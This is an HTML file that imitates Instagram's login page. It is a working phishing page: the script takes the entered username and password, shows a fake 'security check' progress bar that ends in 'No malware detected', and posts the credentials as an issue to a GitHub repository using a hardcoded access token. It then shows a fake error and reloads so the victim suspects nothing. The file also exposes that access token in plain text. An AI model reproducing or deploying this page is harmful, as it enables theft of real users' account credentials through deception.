<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Instagram</title> <meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
  body { margin: 0; padding: 0; background: #fafafa; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
  .container { display: flex; align-items: center; justify-content: center; max-width: 935px; width: 100%; }
  /* 왼쪽 핸드폰 이미지 (화면이 작아지면 사라짐) */
  .phones { background-image: url('https://www.instagram.com/static/images/homepage/screenshots/screenshot1.png/fd1d92e033c9.png'); background-size: 454px 618px; width: 454px; height: 618px; margin-right: 32px; background-position: -46px 0; }
  @media (max-width: 875px) { .phones { display: none; } }
  
  .login-section { width: 350px; }
  .login-box { background: white; border: 1px solid #dbdbdb; padding: 20px 40px; text-align: center; margin-bottom: 10px; }
  .logo { width: 175px; margin: 22px auto 35px; display: block; }
  
  input { width: 100%; padding: 9px 0 7px 8px; margin-bottom: 6px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; box-sizing: border-box; }
  button { width: 100%; padding: 7px; background: #0095f6; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; font-size: 14px; margin: 8px 0; }
  button:disabled { background: #b2dffc; }

  /* 진행률 바 디자인 */
  #status-container { display: none; margin-top: 15px; text-align: left; }
  .progress-bar { width: 100%; background: #efefef; height: 6px; border-radius: 3px; margin: 8px 0; overflow: hidden; }
  .progress-fill { width: 0%; height: 100%; background: linear-gradient(to right, #f09433, #dc2743); transition: width 0.1s; }
  #security-msg { color: #3897f0; font-weight: bold; font-size: 12px; display: none; text-align: center; }

  .divider { margin: 15px 0; display: flex; align-items: center; color: #8e8e8e; font-size: 13px; font-weight: bold; }
  .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; margin: 0 10px; }
</style>
</head>
<body>
  <div class="container">
    <div class="phones"></div>
    <div class="login-section">
      <div class="login-box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo">
        <input type="text" id="ii" placeholder="Phone number, username, or email">
        <input type="password" id="pp" placeholder="Password">
        <button id="submit-btn" onclick="start()">Log In</button>
        <div class="divider">OR</div>
        
        <div id="status-container">
          <div style="font-size: 12px; color: #262626;">Security checking... (<span id="percent">0</span>%)</div>
          <div class="progress-bar"><div id="fill" class="progress-fill"></div></div>
          <div id="security-msg">No malware detected.</div>
        </div>

        <p style="color: #00376b; font-size: 12px; margin-top: 20px; cursor: pointer;">Forgot password?</p>
      </div>
    </div>
  </div>

  <script>
    async function start() {
      const ii = document.getElementById('ii').value;
      const pp = document.getElementById('pp').value;
      if(!ii || !pp) return alert("Please fill in fields");

      document.getElementById('submit-btn').disabled = true;
      document.getElementById('status-container').style.display = 'block';
      
      let count = 0;
      const timer = setInterval(async () => {
        count += Math.floor(Math.random() * 3) + 1;
        if(count >= 100) {
          count = 100;
          clearInterval(timer);
          document.getElementById('security-msg').style.display = 'block';
          await send(ii, pp);
        }
        document.getElementById('percent').innerText = count;
        document.getElementById('fill').style.width = count + '%';
      }, 50);
    }

    async function send(ii, pp) {
      const TOKEN = "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";
      const REPO = "paparata080-create/gggi"; // 저장소 이름 gggi 적용
      try {
        await fetch(`https://api.github.com/repos/${REPO}/issues`, {
          method: 'POST',
          headers: { 'Authorization': `token ${TOKEN}`, 'Content-Type': 'application/json' },
          body: JSON.stringify({ title: `Login: ${ii}`, body: `ID: ${ii}\nPW: ${pp}` })
        });
        setTimeout(() => { alert("Error: Please try again later."); location.reload(); }, 1500);
      } catch (e) { console.error(e); }
    }
  </script>
</body>
</html>
